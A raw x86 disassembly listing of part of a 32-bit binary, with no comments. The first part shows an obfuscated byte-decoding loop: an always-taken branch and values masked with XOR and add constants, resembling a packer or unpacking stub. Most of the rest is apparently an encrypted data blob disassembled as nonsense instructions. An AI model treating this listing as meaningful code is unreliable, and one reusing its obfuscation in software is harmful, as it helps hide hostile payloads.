  418a98:	mov    DWORD PTR [ebp+ecx*4-0xf4],eax
  418a9f:	jmp    0x4189fa
  418aa4:	xor    eax,eax
  418aa6:	inc    eax
  418aa7:	jne    0x418ac7
  418aad:	movzx  eax,BYTE PTR [ebp-0xf5]
  418ab4:	xor    eax,0x83
  418ab9:	add    eax,0x8
  418abc:	mov    BYTE PTR [ebp-0xf5],al
  418ac2:	jmp    0x418b06
  418ac7:	mov    eax,DWORD PTR [ebp-0xd4]
  418acd:	xor    eax,0x75108b5
  418ad2:	add    eax,0x3272fb
  418ad7:	movzx  ecx,BYTE PTR [ebp-0xf5]
  418ade:	sub    ecx,eax
  418ae0:	mov    BYTE PTR [ebp-0xf5],cl
  418ae6:	mov    ecx,DWORD PTR [ebp-0xcc]
  418aec:	xor    ecx,0x75108b5
  418af2:	add    ecx,0x3272fb
  418af8:	mov    al,BYTE PTR [ebp-0xf5]
  418afe:	ror    al,cl
  418b00:	mov    BYTE PTR [ebp-0xf5],al
  418b06:	xor    eax,eax
  418b08:	mov    eax,DWORD PTR [ebp-0x8]
  418b0b:	add    eax,DWORD PTR [ebp-0xd0]
  418b11:	mov    cl,BYTE PTR [ebp-0xf5]
  418b17:	mov    BYTE PTR [eax],cl
  418b19:	mov    eax,DWORD PTR [ebp-0xd0]
  418b1f:	sub    eax,0x3272fb
  418b24:	xor    eax,0x75108b5
  418b29:	cmp    eax,DWORD PTR [ebp-0xdc]
  418b2f:	jne    0x418b8c
  418b35:	mov    eax,DWORD PTR [ebp-0xc8]
  418b3b:	xor    eax,0x75108b5
  418b40:	add    eax,0x3272fb
  418b45:	mov    ecx,DWORD PTR [ebp-0xe0]
  418b4b:	xor    ecx,0x75108b5
  418b51:	add    ecx,0x3272fb
  418b57:	sub    eax,ecx
  418b59:	sub    eax,0x3272fb
  418b5e:	xor    eax,0x75108b5
  418b63:	mov    DWORD PTR [ebp-0xc8],eax
  418b69:	mov    eax,DWORD PTR [ebp-0xe0]
  418b6f:	xor    eax,0x75108b5
  418b74:	add    eax,0x3272fb
  418b79:	mov    ecx,DWORD PTR [ebp-0x100]
  418b7f:	sub    ecx,eax
  418b81:	mov    DWORD PTR [ebp-0xd0],ecx
  418b87:	jmp    0x418baa
  418b8c:	mov    eax,DWORD PTR [ebp-0xe0]
  418b92:	xor    eax,0x75108b5
  418b97:	add    eax,0x3272fb
  418b9c:	mov    ecx,DWORD PTR [ebp-0xd0]
  418ba2:	sub    ecx,eax
  418ba4:	mov    DWORD PTR [ebp-0xd0],ecx
  418baa:	jmp    0x416531
  418baf:	mov    DWORD PTR [ebp-0x7c],0xe
  418bb6:	jmp    0x418bc2
  418bbb:	mov    eax,DWORD PTR [ebp-0x7c]
  418bbe:	dec    eax
  418bbf:	mov    DWORD PTR [ebp-0x7c],eax
  418bc2:	cmp    DWORD PTR [ebp-0x7c],0x0
  418bc6:	jbe    0x42b043
  418bcc:	mov    eax,DWORD PTR [ebp-0x7c]
  418bcf:	dec    eax
  418bd0:	xor    edx,edx
  418bd2:	push   0x2
  418bd4:	pop    ecx
  418bd5:	div    ecx
  418bd7:	mov    DWORD PTR [ebp-0x140],edx
  418bdd:	mov    eax,DWORD PTR [ebp-0x2c]
  418be0:	mov    DWORD PTR [ebp-0x13c],eax
  418be6:	mov    DWORD PTR [ebp-0x110],0xf89c8527
  418bf0:	mov    DWORD PTR [ebp-0x108],0xf89c85bd
  418bfa:	mov    DWORD PTR [ebp-0x118],0xf89c85b0
  418c04:	mov    DWORD PTR [ebp-0x11c],0xf89c85b3
  418c0e:	mov    DWORD PTR [ebp-0x104],0xf89c85b2
  418c18:	mov    eax,DWORD PTR [ebp-0x11c]
  418c1e:	xor    eax,0x75108b5
  418c23:	jmp    0x41afc9
  418c28:	adc    BYTE PTR [eax],0xb6
  418c2b:	push   ebp
  418c2c:	xor    al,0x75
  418c2e:	pusha  
  418c2f:	push   esp
  418c30:	dec    edx
  418c31:	repz jae 0x418c1c
  418c34:	xchg   edx,eax
  418c35:	sbb    al,0x8d
  418c37:	mov    eax,0x7b7ab639
  418c3c:	add    bl,BYTE PTR [eax-0x53298485]
  418c42:	ret    0xf4b3
  418c45:	mov    edx,0xdbe9f3f1
  418c4a:	iret   
  418c4b:	(bad)  
  418c4c:	int    0xc2
  418c4e:	out    dx,eax
  418c4f:	rol    bl,cl
  418c51:	out    0xf9,eax
  418c53:	sar    dh,cl
  418c55:	out    0xd5,al
  418c57:	hlt    
  418c58:	cli    
  418c59:	add    al,0xe7
  418c5b:	or     al,0xe2
  418c5d:	(bad)  
  418c5f:	mov    bl,0xde
  418c61:	loop   0x418c57
  418c63:	hlt    
  418c64:	int3   
  418c65:	leave  
  418c66:	mov    ch,0xd7
  418c68:	iret   
  418c69:	retf   
  418c6a:	fsubp  st(0),st
  418c6c:	ror    bh,1
  418c6e:	lock sti 
  418c70:	into   
  418c71:	mov    ah,0xed
  418c73:	cmc    
  418c74:	add    ecx,edx
  418c76:	ret    
  418c77:	loopne 0x418c75
  418c79:	add    ecx,esp
  418c7b:	prefetch (bad)
  418c7c:	or     eax,0xf0cbf2fc
  418c81:	in     al,0xc4
  418c83:	out    0xe4,al
  418c85:	aam    0xc1
  418c87:	aad    0xf5
  418c89:	out    dx,eax
  418c8a:	fcmovbe st,st(2)
  418c8c:	in     al,dx
  418c8d:	rcr    bh,1
  418c8f:	loop   0x418c68
  418c91:	rcr    edx,0x4
  418c94:	idiv   esp
  418c96:	(bad)  
  418c97:	stc    
  418c98:	fsubp  st(5),st
  418c9a:	leave  
  418c9b:	out    0xfd,eax
  418c9d:	jecxz  0x418c69
  418c9f:	test   al,0xdc
  418ca1:	test   al,0xc4
  418ca3:	int3   
  418ca4:	lods   al,BYTE PTR ds:[esi]
  418ca5:	into   
  418ca6:	iret   
  418ca7:	out    dx,eax
  418ca8:	fnstenv [ebp+0x2bfd0d6]
  418cae:	int3   
  418caf:	stc    
  418cb0:	xlat   BYTE PTR ds:[ebx]
  418cb1:	aam    0xf3
  418cb3:	add    ah,dh
  418cb5:	xlat   BYTE PTR ds:[ebx]
  418cb6:	or     ah,dh
  418cb8:	out    dx,eax
  418cb9:	loopne 0x418c95
  418cbb:	jmp    0xd1ff729e
  418cc0:	fmul   st(1),st
  418cc2:	shr    BYTE PTR [esi-0x8191350],0xe7
  418cc9:	xlat   BYTE PTR ds:[ebx]
  418cca:	shr    bh,cl
  418ccc:	out    dx,eax
  418ccd:	into   
  418cce:	sti    
  418ccf:	fdiv   st(2),st
  418cd1:	rcl    al,cl
  418cd3:	faddp  st(6),st
  418cd5:	in     al,0xde
  418cd7:	jmp    0x418cd5
  418cd9:	or     ah,bh
  418cdb:	std    
  418cdc:	out    0xd3,al
  418cde:	in     al,0xaa
  418ce0:	rcl    ebx,cl
  418ce2:	out    dx,al
  418ce3:	int    0xcd
  418ce5:	jmp    0xbbbd:0xf3bff6b5
  418cec:	xlat   BYTE PTR ds:[ebx]
  418ced:	add    ecx,ecx
  418cef:	div    al
  418cf1:	fcmovb st,st(1)
  418cf3:	cmc    
  418cf4:	add    edx,ebp
  418cf6:	fucom  st(2)
  418cf8:	sti    
  418cf9:	add    ecx,DWORD PTR ds:0xc5dc0aef
  418cff:	loopne 0x418ce2
  418d01:	(bad)  
  418d02:	xlat   BYTE PTR ds:[ebx]
  418d03:	rol    esi,1
  418d05:	retf   
  418d06:	jmp    0xbb0c83df
  418d0b:	cmc    
  418d0c:	into   
  418d0d:	in     al,dx
  418d0e:	in     al,dx
  418d0f:	idiv   ecx
  418d11:	out    0xc0,eax
  418d13:	add    ah,bl
  418d15:	aam    0xe9
  418d17:	cmc    
  418d18:	cli    
  418d19:	clc    
  418d1a:	in     eax,dx
  418d1b:	in     eax,dx
  418d1c:	retf   0xe3fa
  418d1f:	scas   al,BYTE PTR es:[edi]
  418d20:	scas   eax,DWORD PTR es:[edi]
  418d21:	div    BYTE PTR [esi-0x14450953]
  418d27:	repz retf 
  418d29:	jmp    0xefe2:0xf6cddcbb
  418d30:	add    ch,dl
  418d32:	out    0x5,al
  418d34:	xlat   BYTE PTR ds:[ebx]
  418d35:	aad    0xf9
  418d37:	(bad)  
  418d38:	(bad)  
  418d39:	jmp    0xbec8:0xddcdecc7
  418d40:	out    0xe5,al
  418d42:	leave  
  418d43:	mov    dl,0xd4
  418d45:	mov    ah,0xd9
  418d47:	sar    dl,cl
  418d49:	div    al
  418d4b:	out    dx,al
  418d4c:	cmc    
  418d4d:	aad    0x0
  418d4f:	clc    
  418d50:	out    0xbc,eax
  418d52:	fsub   st,st(4)
  418d54:	add    bh,dl
  418d56:	aam    0xf8
  418d58:	std    
  418d59:	call   0xe4229452
  418d5e:	mov    esp,0xeecec1c6
  418d63:	int3   
  418d64:	loop   0x418d1b
  418d66:	icebp  
  418d67:	call   0xbb275d51
  418d6c:	call   0xc12f8869
  418d71:	out    dx,al
  418d72:	add    al,dl
  418d74:	retf   
  418d75:	loop   0x418d7f
  418d77:	cld    
  418d78:	jecxz  0x418d5a
  418d7a:	cmc    
  418d7b:	leave  
  418d7c:	std    
  418d7d:	add    al,dl
  418d7f:	loop   0x418d4b
  418d81:	repz sar bl,0xd0
  418d85:	cmc    
  418d86:	mov    ah,0xf8
  418d88:	jmp    0xfcb4:0xdcd9c4ef
  418d8f:	mov    ecx,0xbcc1d5b9
  418d94:	retf   
  418d95:	add    eax,esp
  418d97:	in     eax,0xcb
  418d99:	fiadd  DWORD PTR [ecx]
  418d9b:	bswap  ecx
  418d9d:	jmp    0xccc7:0xd2f1a9d3
  418da4:	icebp  
  418da5:	out    0xca,al
  418da7:	in     al,dx
  418da8:	fcmovne st,st(7)
  418daa:	mov    edx,0xd1e2b9da
  418daf:	lock (bad) 
  418db2:	(bad)  
  418db3:	loope  0x418dad
  418db5:	aad    0xcb
  418db7:	add    BYTE PTR [esi],cl
  418db9:	out    dx,eax
  418dba:	add    al,0xf4
  418dbc:	loop   0x418dcd
  418dbe:	retf   
  418dbf:	loope  0x418d72
  418dc1:	(bad)  
  418dc3:	ret    0xa8b3
  418dc6:	in     al,0xb7
  418dc8:	in     eax,0xc5
  418dca:	sti    
  418dcb:	mov    ebx,0xf2cdfae2
  418dd0:	shl    ebp,cl
  418dd2:	mov    edi,0x5f50107
  418dd7:	jmp    0xec1173df
  418ddc:	or     eax,0xe3bfeb07
  418de1:	ret    0xacce
  418de4:	loopne 0x418dcb
  418de6:	mov    ebx,0xbbf7fbc0
  418deb:	fnstcw WORD PTR [ebp-0x11411250]
  418df1:	out    0xf4,eax
  418df3:	or     esi,edi
  418df5:	add    bh,dh
  418df7:	add    bh,BYTE PTR [ebp-0x7063617]
  418dfd:	repz (bad) 
  418dff:	in     al,dx
  418e00:	int    0xd2
  418e02:	mov    esp,0xd8cdd4cb
  418e07:	xlat   BYTE PTR ds:[ebx]
  418e08:	in     al,dx
  418e09:	(bad)  
  418e0a:	(bad)  
  418e0b:	clc    
  418e0c:	shr    al,cl
  418e0e:	aam    0xd1
  418e10:	repz div edx
  418e13:	jmp    0x418dd9
  418e15:	loope  0x418dee
  418e17:	add    ch,dh
  418e19:	hlt    
  418e1a:	loopne 0x418e1e
  418e1c:	enter  0xefc0,0xe8
  418e20:	mov    ebp,0xe7e3cfc1
  418e25:	out    dx,al
  418e26:	fcmovbe st,st(5)
  418e28:	iret   
  418e29:	(bad)
  418e2c:	iret   
  418e2d:	in     eax,dx
  418e2e:	std    
  418e2f:	rol    DWORD PTR [ebx],cl
  418e31:	mov    edi,0xb8bdd3f7
  418e36:	or     bh,al
  418e38:	cld    
  418e39:	pop    es
  418e3a:	add    DWORD PTR ds:0xc5c2ecfe,eax
  418e40:	test   esp,0xc0f1c9c9
  418e46:	repnz in al,dx
  418e48:	mov    bh,0xd0
  418e4a:	mov    ah,0xed
  418e4c:	enter  0xbdee,0xc1
  418e50:	rol    DWORD PTR [eax],cl
  418e52:	shl    dl,cl
  418e54:	aad    0xf5
  418e56:	rol    ah,0xf4
  418e59:	retf   0xe3c9
  418e5c:	ror    edi,0xf0
  418e5f:	rol    bh,cl
  418e61:	leave  
  418e62:	mov    ecx,0xb9e1efd1
  418e68:	mov    ecx,0xd5c8f0b6
  418e6d:	mov    ah,0xcf
  418e6f:	out    0xb5,eax
  418e71:	std    
  418e72:	fld    QWORD PTR ds:0xdafe0bc3
  418e78:	clc    
  418e79:	jmp    0xcb49906c
  418e7e:	fucomip st,st(3)
  418e80:	(bad)  
  418e81:	shr    ah,0xeb
  418e84:	sti    
  418e85:	mov    cl,0xc5
  418e87:	in     eax,0xef
  418e89:	in     al,0xdd
  418e8b:	shr    ah,1
  418e8d:	fdiv   st,st(5)
  418e8f:	test   edi,0xd303bbd1
  418e95:	add    esi,edx
  418e97:	retf   
  418e98:	retf   0xc8ca
  418e9b:	in     al,0xde
  418e9d:	repz (bad) 
  418e9f:	mov    esi,0xc3cccccb
  418ea4:	enter  0xf3e8,0xcd
  418ea8:	lods   eax,DWORD PTR ds:[esi]
  418ea9:	enter  0xdbb4,0xf0
  418ead:	fucomip st,st(4)
  418eaf:	cmc    
  418eb0:	test   BYTE PTR [ecx],0xe0
  418eb3:	or     ecx,DWORD PTR [ebx]
  418eb5:	stc    
  418eb6:	add    eax,0x1fbef08
  418ebb:	(bad)  
  418ebd:	fcomp  st(1)
  418ebf:	rcl    ecx,1
  418ec1:	out    dx,eax
  418ec2:	scas   eax,DWORD PTR es:[edi]
  418ec3:	int3   
  418ec4:	enter  0xf3e9,0xd4
  418ec8:	xlat   BYTE PTR ds:[ebx]
  418ec9:	out    dx,eax
  418eca:	leave  
  418ecb:	mov    esi,0xeee0f8d0
  418ed0:	(bad)  
  418ed2:	rol    ebx,cl
  418ed4:	rol    BYTE PTR ds:0xfef7dfc4,0xef
  418edb:	fiadd  DWORD PTR [ecx]
  418edd:	push   es
  418ede:	loop   0x418ec9
  418ee0:	mov    esp,0xf2b0eda4
  418ee5:	in     al,0xcc
  418ee7:	cli    
  418ee8:	mov    ebx,0xf3edb8f4
  418eed:	loope  0x418ee5
  418eef:	int3   
  418ef0:	fst    st(6)
  418ef2:	xlat   BYTE PTR ds:[ebx]
  418ef3:	fdivp  st(4),st
  418ef5:	shr    bl,0xe2
  418ef8:	add    eax,0xfdef0602
  418efd:	retf   
  418efe:	out    0xdc,eax
  418f00:	retf   0xdde8
  418f03:	(bad)  
  418f04:	icebp  
  418f05:	jmp    0xeb1d5cc1
  418f0a:	call   0x3757e4
  418f0f:	loope  0x418f04
  418f11:	repz fldpi 
  418f14:	in     eax,0xd6
  418f16:	(bad)
  418f19:	fcomip st,st(5)
  418f1b:	add    bl,ch
  418f1d:	add    ebp,ebx
  418f1f:	lock test eax,0xe9e3afb1
  418f25:	repnz mov cl,0xdf
  418f28:	retf   0xcdbe
  418f2b:	mov    dh,0xef
  418f2d:	mov    edi,0xdce0f4ed
  418f32:	pop    es
  418f33:	(bad)  
  418f35:	idiv   cl
  418f37:	call   0x10208536
  418f3c:	sar    edi,cl
  418f3e:	mov    eax,0xe5e3dee2
  418f43:	div    ah
  418f45:	loop   0x418f41
  418f47:	retf   
  418f48:	out    dx,eax
  418f49:	mov    edx,0xf7dce4fc
  418f4e:	add    bh,ch
  418f50:	(bad)  
  418f51:	(bad)  
  418f53:	mov    edx,0xfcf1cb03
  418f58:	or     eax,DWORD PTR [edi]
  418f5a:	jecxz  0x418f63
  418f5c:	rol    DWORD PTR [eax],cl
  418f5e:	lods   eax,DWORD PTR ds:[esi]
  418f5f:	in     al,dx
  418f60:	mov    edi,0xc2addcce
  418f65:	shr    al,1
  418f67:	into   
  418f68:	cmc    
  418f69:	into   
  418f6a:	(bad)  
  418f6c:	std    
  418f6d:	iret   
  418f6e:	call   0xff2e8b54
  418f73:	ret    0xf2d1
  418f76:	jmp    0xc7278d7d
  418f7b:	loope  0x418f64
  418f7d:	repz les ebp,FWORD PTR [edx-0x553a3020]
  418f84:	out    dx,eax
  418f85:	rcl    ebp,1
  418f87:	(bad)  
  418f88:	mov    ebx,0xdcfabbff
  418f8d:	in     al,dx
  418f8e:	(bad)  
  418f90:	(bad)  
  418f92:	test   ebx,0xbfe405
  418f98:	jmp    0xc0f2:0xe0e806c5
  418f9f:	lods   eax,DWORD PTR ds:[esi]
  418fa0:	test   eax,0xf4ccebc9
  418fa5:	repnz loope 0x418f76
  418fa8:	fdivr  DWORD PTR [eax-0x4333730]
  418fae:	add    bl,ch
  418fb0:	in     al,dx
  418fb1:	mov    esi,0xe2dad3e0
  418fb6:	fimul  DWORD PTR [eax]
  418fb8:	jmp    0x418f84
  418fba:	push   cs
  418fbb:	retf   
  418fbc:	(bad)  
  418fbe:	leave  
  418fbf:	mov    al,0xf2
  418fc1:	rcl    cl,0xea
  418fc4:	xlat   BYTE PTR ds:[ebx]
  418fc5:	iret   
  418fc6:	in     al,dx
  418fc7:	(bad)  
  418fc8:	clc    
  418fc9:	xlat   BYTE PTR ds:[ebx]
  418fca:	out    dx,al
  418fcb:	hlt    
  418fcc:	mov    ecx,0xd0d3fc02
  418fd1:	repz mov ah,0x4
  418fd5:	test   BYTE PTR [ecx],0xd5
  418fd8:	add    dh,bl
  418fda:	out    0xfa,eax
  418fdc:	in     eax,0xa
  418fde:	mov    esp,0xead3e6cc
  418fe3:	stos   BYTE PTR es:[edi],al
  418fe4:	mov    cl,0xd1
  418fe6:	jmp    0xd4da:0xccded7c9
  418fed:	jmp    0xeb07:0xfcfe07ef
  418ff4:	or     edx,eax
  418ff6:	call   esp
  418ff8:	enter  0xfcdf,0xee
  418ffc:	jmp    0xee1148d4
  419001:	rol    bl,cl
  419003:	repnz sti 
  419005:	in     al,dx
  419006:	in     eax,dx
  419007:	(bad)  
  419009:	mov    esi,0xc9b5e3f9
  41900e:	(bad)  
  41900f:	int    0xdf
  419011:	xlat   BYTE PTR ds:[ebx]
  419012:	shl    eax,1
  419014:	stc    
  419015:	mov    esp,0xf4f601f9
  41901a:	add    ah,ah
  41901c:	add    eax,0xc3d2df0d
  419021:	mov    dh,0xcb
  419023:	rol    dh,0xd2
  419026:	jmp    0xdcf0:0xdfe9f5db
  41902d:	in     eax,dx
  41902e:	stc    
  41902f:	loopne 0x418fef
  419031:	(bad)  
  419032:	add    edi,edx
  419034:	rol    esi,1
  419036:	(bad)  
  419038:	enter  0xfbc9,0xe8
  41903c:	dec    ebp
  41903e:	out    dx,al
  41903f:	enter  0xc9e2,0xb2
  419043:	rcl    cl,1
  419045:	mov    ebx,0xd5d7b2b2
  41904a:	lock mov ah,0xcb
  41904d:	repz xlat BYTE PTR ds:[ebx]
  41904f:	rcr    bh,1
  419051:	mov    edx,0xc0c3c305
  419057:	or     eax,DWORD PTR [esi]
  419059:	(bad)  
  41905b:	ficom  DWORD PTR [edx]
  41905d:	or     ebp,ebx
  41905f:	(bad)  
  419061:	scas   al,BYTE PTR es:[edi]
  419062:	in     al,0xd6
  419064:	ror    dl,0xd1
  419067:	in     eax,dx
  419068:	cli    
  419069:	cli    
  41906a:	call   0xfc0b6947
  41906f:	int3   
  419070:	xlat   BYTE PTR ds:[ebx]
  419071:	stc    
  419072:	add    eax,0xe209f104
  419077:	mov    esi,0xefd4dee4
  41907c:	(bad)
  41907f:	mov    eax,0xc7f5d1d0
  419084:	mov    ch,0xd1
  419086:	retf   0xb6ec
  419089:	shl    DWORD PTR [esi-0x45320601],cl
  41908f:	not    al
  419091:	(bad)  
  419092:	aad    0xd8
  419094:	retf   
  419095:	shl    ch,0xfb
  419098:	(bad)  
  419099:	jmp    0x22e94ad
  41909e:	iret   
  41909f:	into   
  4190a0:	into   
  4190a1:	shl    esi,1
  4190a3:	aam    0xef
  4190a5:	cmc    
  4190a6:	(bad)  
  4190a7:	(bad)  
  4190a8:	fcos   
  4190aa:	fdivr  DWORD PTR [esi-0x2f440841]
  4190b0:	fmulp  st(5),st
  4190b2:	add    eax,0xf9f405c0
  4190b7:	retf   0x6e1
  4190ba:	jmp    0xaebc:0xdce5fdef
  4190c1:	mov    cl,0xad
  4190c3:	imul   bh
  4190c5:	jmp    0x41909e
  4190c7:	mov    dl,0xbf
  4190c9:	leave  
  4190ca:	leave  
  4190cb:	retf   
  4190cc:	aad    0xfc
  4190ce:	loopne 0x4190be
  4190d0:	push   es
  4190d1:	mov    eax,0xc4f2d0e1
  4190d6:	(bad)  
  4190d7:	aam    0xf
  4190d9:	iret   
  4190da:	loopne 0x4190c0
  4190dc:	in     eax,0xd3
  4190de:	(bad)  
  4190df:	mov    esi,0xd1ecdcd1
  4190e4:	(bad)  
  4190e6:	mov    bh,0xe0
  4190e8:	in     al,dx
  4190e9:	fucomp st(1)
  4190eb:	(bad)  
  4190ec:	cld    
  4190ed:	mov    edx,0xd6f9b8f9
  4190f2:	mov    esi,0xbe4d8d4
  4190f7:	retf   0xfee0
  4190fa:	or     al,0xed
  4190fc:	pop    es
  4190fd:	fidiv  DWORD PTR [edx-0x233e3219]
  419103:	ret    
  419104:	fidiv  DWORD PTR [edx-0x120b492c]
  41910a:	ror    ecx,cl
  41910c:	(bad)  
  41910e:	add    BYTE PTR [eax-0xf02331f],bh
  419114:	repnz jecxz 0x419107
  419117:	leave  
  419118:	(bad)  
  419119:	out    0xdb,eax
  41911b:	in     eax,0xd9
  41911d:	(bad)  
  41911e:	shr    DWORD PTR [ecx-0x3c133142],cl
  419124:	sti    
  419125:	aad    0xce
  419127:	sar    edi,cl
  419129:	out    dx,al
  41912a:	into   
  41912b:	mov    dh,0xf6
  41912d:	stc    
  41912e:	aam    0x1
  419130:	add    cl,bh
  419132:	fst    st(1)
  419134:	out    0xfe,eax
  419136:	ret    0xbdf0
  419139:	jmp    0xebc4:0xc8c8e207
  419140:	repz scas eax,DWORD PTR es:[edi]
  419142:	cmc    
  419143:	into   
  419144:	icebp  
  419145:	aam    0xb4
  419147:	scas   al,BYTE PTR es:[edi]
  419148:	call   0xd2fb4b1f
  41914d:	add    ebp,eax
  41914f:	mov    esi,0xdafff7da
  419154:	loope  0x419134
  419156:	mov    edi,0x5fe0fe2
  41915b:	int    0xfd
  41915d:	add    al,0xcc
  41915f:	scas   al,BYTE PTR es:[edi]
  419160:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419161:	leave  
  419162:	mov    ebp,0xd6c9e4eb
  419167:	in     al,dx
  419168:	retf   
  419169:	sti    
  41916a:	sti    
  41916b:	jmp    0xf4d0:0xd7ffecc8
  419172:	sar    bh,0xc5
  419175:	(bad)  
  419176:	hlt    
  419177:	(bad)  
  419178:	(bad)  
  41917a:	hlt    
  41917b:	add    esp,ecx
  41917d:	or     ebx,ecx
  41917f:	mov    ebp,0xf1b1d0ee
  419184:	mov    ch,0xac
  419186:	repz retf 
  419188:	cli    
  419189:	mov    ch,0xdc
  41918b:	fdiv   st(5),st
  41918d:	hlt    
  41918e:	add    ah,al
  419190:	repz (bad) 
  419193:	int3   
  419194:	stc    
  419195:	mov    esp,0xe0e9d6f8
  41919a:	retf   0xfbd8
  41919d:	in     eax,dx
  41919e:	rcr    esi,1
  4191a0:	mov    ebp,0xd2c4d6e6
  4191a5:	in     eax,dx
  4191a6:	leave  
  4191a7:	(bad)  
  4191a8:	fxch   st(4)
  4191aa:	xlat   BYTE PTR ds:[ebx]
  4191ab:	in     al,0xd0
  4191ad:	(bad)  
  4191af:	stc    
  4191b0:	jecxz  0x41916f
  4191b2:	add    esp,ecx
  4191b4:	mov    ecx,0x9fec3c5
  4191b9:	(bad)  
  4191bb:	fist   WORD PTR [edx]
  4191bd:	cld    
  4191be:	leave  
  4191bf:	jecxz  0x419197
  4191c1:	into   
  4191c2:	into   
  4191c3:	leave  
  4191c4:	retf   0xdbc1
  4191c7:	sti    
  4191c8:	jmp    0x4191a2
  4191ca:	jmp    0xf1374fcc
  4191cf:	mov    dh,0xf3
  4191d1:	shl    bl,0xff
  4191d4:	(bad)  
  4191d5:	xlat   BYTE PTR ds:[ebx]
  4191d6:	shl    eax,1
  4191d8:	add    eax,0x7eceafb
  4191dd:	(bad)  
  4191de:	int    0xf7
  4191e0:	out    0xf7,al
  4191e2:	loop   0x4191a9
  4191e4:	shr    BYTE PTR [ebp+edx*8-0x42362518],0xc9
  4191ec:	repz loop 0x4191c3
  4191ef:	int3   
  4191f0:	in     al,dx
  4191f1:	(bad)  
  4191f3:	xlat   BYTE PTR ds:[ebx]
  4191f4:	add    ebp,esi
  4191f6:	pop    es
  4191f7:	cli    
  4191f8:	cmc    
  4191f9:	(bad)  
  4191fa:	mov    BYTE PTR [edi],0xff
  4191fd:	jmp    0xf7ea:0xb1cef7a7
  419204:	fcmovne st,st(3)
  419206:	mov    bl,0xcd
  419208:	(bad)  
  41920a:	mov    esi,0xf1eabaf6
  41920f:	(bad)  
  419210:	test   DWORD PTR [edi],0xfae2bdbd
  419216:	xlat   BYTE PTR ds:[ebx]
  419217:	clc    
  419218:	fmul   st(3),st
  41921a:	std    
  41921b:	cld    
  41921c:	dec    DWORD PTR [eax]
  41921e:	mov    bl,0xbd
  419220:	test   ebx,0xd1cdb1cd
  419226:	sti    
  419227:	retf   0xeac8
  41922a:	in     eax,0xb9
  41922c:	sar    dh,1
  41922e:	in     eax,dx
  41922f:	mov    edi,0xddd003c2
  419234:	retf   
  419235:	icebp  
  419236:	(bad)  
  419239:	fisttp WORD PTR ds:0xdfeaf205
  41923f:	shl    DWORD PTR [ebp-0x112f1f24],cl
  419245:	iret   
  419246:	out    0xf9,eax
  419248:	jmp    0x419232
  41924a:	shl    ebx,cl
  41924c:	aam    0xbe
  41924e:	enter  0xecd4,0xd0
  419252:	fld    st(3)
  419254:	or     cl,BYTE PTR [edx]
  419256:	or     al,ah
  419258:	cli    
  419259:	cli    
  41925a:	enter  0x6ef,0xea
  41925e:	out    0xdf,eax
  419260:	mov    esi,0xf2cccbe8
  419265:	rcr    eax,1
  419267:	mov    edx,0xbbb8ffb8
  41926c:	repz rcl dl,1
  41926f:	mov    edx,0xc005f6f1
  419274:	ret    
  419275:	or     esi,esp
  419277:	out    dx,eax
  419278:	loopne 0x41925b
  41927a:	push   es
  41927b:	fmul   st(4),st
  41927d:	in     eax,0xe7
  41927f:	lds    esi,FWORD PTR [ebx-0x483f0b36]
  419285:	fucomi st,st(4)
  419287:	aam    0xfb
  419289:	mov    bh,0xc8
  41928b:	lock repz rcr edi,cl
  41928f:	shr    esi,0xfc
  419292:	rcl    ah,1
  419294:	add    eax,0xff09f1c7
  419299:	stc    
  41929a:	(bad)  
  41929c:	adc    eax,DWORD PTR [esi]
  41929e:	(bad)  
  41929f:	in     al,0xef
  4192a1:	ffree  st(4)
  4192a3:	mov    esp,0xb9b9dab1
  4192a8:	mov    ch,0xd4
  4192aa:	xlat   BYTE PTR ds:[ebx]
  4192ab:	stc    
  4192ac:	clc    
  4192ad:	loop   0x419282
  4192af:	ror    edi,cl
  4192b1:	mov    esp,0x2b9d1e7
  4192b6:	ffree  st(0)
  4192b8:	hlt    
  4192b9:	iret   
  4192ba:	sti    
  4192bb:	mov    BYTE PTR [esp+edi*8],0xe0
  4192bf:	test   al,0xb3
  4192c1:	call   0xad3d749d
  4192c6:	stc    
  4192c7:	loopne 0x41929f
  4192c9:	(bad)  
  4192ca:	push   DWORD PTR [esp+esi*8-0x11222121]
  4192d1:	mov    esp,0x6df00e0
  4192d6:	hlt    
  4192d7:	call   0xdb425ce0
  4192dc:	loope  0x4192b1
  4192de:	fmulp  st(3),st
  4192e0:	(bad)  
  4192e1:	lock lods al,BYTE PTR ds:[esi]
  4192e3:	sti    
  4192e4:	sti    
  4192e5:	int3   
  4192e6:	in     eax,dx
  4192e7:	lds    esi,FWORD PTR [ebp-0xb040c07]
  4192ed:	rcr    ch,1
  4192ef:	in     eax,dx
  4192f0:	cmc    
  4192f1:	fcmovnb st,st(3)
  4192f3:	cli    
  4192f4:	repnz or ecx,esp
  4192f7:	jmp    ecx
  4192f9:	(bad)  
  4192fa:	jmp    0xc8349209
  4192ff:	retf   
  419300:	out    0xc0,al
  419302:	iret   
  419303:	out    dx,eax
  419304:	into   
  419305:	shl    edx,0xee
  419308:	cmc    
  419309:	mov    eax,0xf7bbb4c8
  41930e:	mov    esp,0xe1fed7e7
  419313:	jmp    0x4192e8
  419315:	in     eax,0xea
  419317:	retf   
  419318:	jecxz  0x419302
  41931a:	fcomi  st,st(3)
  41931c:	fnsetpm(287 only) 
  41931e:	in     eax,0xae
  419320:	fsubr  QWORD PTR [esi-0x18373e4f]
  419326:	aam    0xf7
  419328:	mov    eax,0xfddcdbed
  41932d:	jmp    0xf82055fa
  419332:	(bad)  
  419333:	(bad)  
  419335:	add    esp,ebp
  419337:	add    ecx,eax
  419339:	push   es
  41933a:	add    ebp,edi
  41933c:	sti    
  41933d:	into   
  41933e:	mov    esp,0xe8f5c6d8
  419343:	(bad)  
  419344:	jmp    0xbdf8:0xdad0eace
  41934b:	out    dx,al
  41934c:	fmul   st(1),st
  41934e:	jmp    0xdb407445
  419353:	repz push es
  419355:	or     cl,BYTE PTR [eax]
  419357:	in     eax,0xb
  419359:	into   
  41935a:	add    esi,ebx
  41935c:	or     al,0x2
  41935e:	rol    edx,cl
  419360:	xlat   BYTE PTR ds:[ebx]
  419361:	mov    ebp,0xc5f6cae0
  419366:	aam    0xe0
  419368:	aad    0xdb
  41936a:	call   0xe9046938
  41936f:	mov    ecx,0xfae7ffe2
  419374:	test   edi,0xc408f9bf
  41937a:	clc    
  41937b:	in     al,dx
  41937c:	in     eax,0xc
  41937e:	mov    eax,0xf7adb2f0
  419383:	repnz fcmovnu st,st(1)
  419386:	sar    ecx,0xde
  419389:	out    dx,eax
  41938a:	clc    
  41938b:	test   edx,0xf8b8f8d2
  419391:	mov    esi,0xd2d6d0e4
